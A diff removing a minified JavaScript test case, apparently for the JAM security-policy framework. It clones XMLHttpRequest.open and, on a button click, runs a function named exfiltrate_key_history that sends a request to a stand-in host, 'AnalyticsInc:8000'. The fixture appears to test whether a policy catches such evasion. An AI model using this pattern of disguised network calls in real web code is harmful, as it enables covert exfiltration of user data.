@@ -1,6 +1,0 @@
-
-JAM.startProfile('load');
-function copy(obj){if("object"!==typeof obj)return obj;var value=obj.valueOf();if(obj!=value)return JAM.new(obj.constructor,[value]);(value=obj instanceof obj.constructor)&&(value=obj.constructor!==Object);if(value){var value=clone(obj.constructor.prototype),property;for(property in obj)if(obj.hasOwnProperty(property)){var v2=value,v3=property;introspect(JAM.policy.p1)var v15=obj[property];v15=copy(v15);JAM.set(v2,v3,v15)}}else for(property in value={},obj){v2=value;v3=property;introspect(JAM.policy.p1)v15=
-obj[property];v15=copy(v15);JAM.set(v2,v3,v15)}return value}function Clone(){}function clone(obj){Clone.prototype=obj;return new Clone}function exfiltrate_key_history(){var v10=xmlhttp=new XMLHttpRequest;introspect(JAM.policy.p1)var v17=xmlhttp.open;v17=copy(v17);v10.opennew=v17;JAM.call(xmlhttp.opennew,xmlhttp,["GET","http://AnalyticsInc:8000/submission.html?test=clone5",!0]);xmlhttp.send(null)}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history);
-
-JAM.stopProfile('load');
